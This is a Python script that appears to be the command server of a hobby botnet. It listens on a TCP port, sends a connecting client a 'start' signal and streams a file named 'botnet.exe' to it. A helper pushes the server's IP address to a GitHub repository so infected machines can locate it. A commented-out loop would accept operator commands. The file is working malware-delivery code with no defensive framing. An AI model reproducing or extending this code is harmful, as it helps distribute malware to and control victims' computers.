import socket,time,psutil,colorama,os,subprocess


def send_b_file(size=1024):
	file = open('botnet.exe','rb')

	file_contents = file.read(size)
	file_contents=bytearray(file_contents)

	while len(file_contents)>0:
		try:
			client.send(file_contents)
			file_contents = file.read(size)
			file_contents=bytearray(file_contents)
			client.recv(1024).decode('utf-8')
		except Exception as err:
			client.send()
			print(err)

	file.close()
	print('done')
	#client.send(''.encode('utf-8'))



def get_ip_addresses():
	family = socket.AF_INET
	for interface, snics in psutil.net_if_addrs().items():
		for snic in snics:
			if snic.family == family and interface=='wlp2s0':
				return snic.address


def update_ip(HOST,PORT):
	if 'ip' not in os.listdir():
		os.mkdir('ip')
		os.chdir('ip')
		subprocess.run('git init',shell=True)
		subprocess.run('git remote add origin git@github.com:indrajith69/server_address.git',shell=True)
		subprocess.run('git branch -M master',shell=True)
		os.chdir('..')

	os.chdir('ip')
	ip_address=str(HOST)+':'+str(PORT)

	with open('ip_address.txt','w') as f:
		f.write(ip_address)

	subprocess.run('git add ip_address.txt',shell=True)
	subprocess.run("git commit -m 'n ip'",shell=True)
	subprocess.run('git push origin --delete master',shell=True)
	subprocess.run('git push origin master',shell=True)

	os.chdir('..')



def server(PORT=5050):
	global client
	HOST = get_ip_addresses()
	PORT = PORT

	#update_ip(HOST,PORT)

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.bind((HOST, PORT))
					
	server.listen()

	client,address = server.accept()
	print(f'connected to {address}\n')

	client.send('start'.encode('utf-8'))
	send_b_file(102400)
	#if client.recv(1024).decode('utf-8')=='done':
	#	print('finished')
	'''
	while True:
		try:
			command = input('Enter a command : ')

			if command=='start':
				client.send(command.encode('utf-8'))
				send_b_file(102400)
				if client.recv(1024).decode('utf-8')=='done':
					print('finished')

			elif command=='exit':
				#client.send(command.encode('utf-8'))
				#if client.recv(1024).decode('utf-8')=='done':
				break

			else:
				pass

		except Exception as error:
			print(error)'''




server(1255)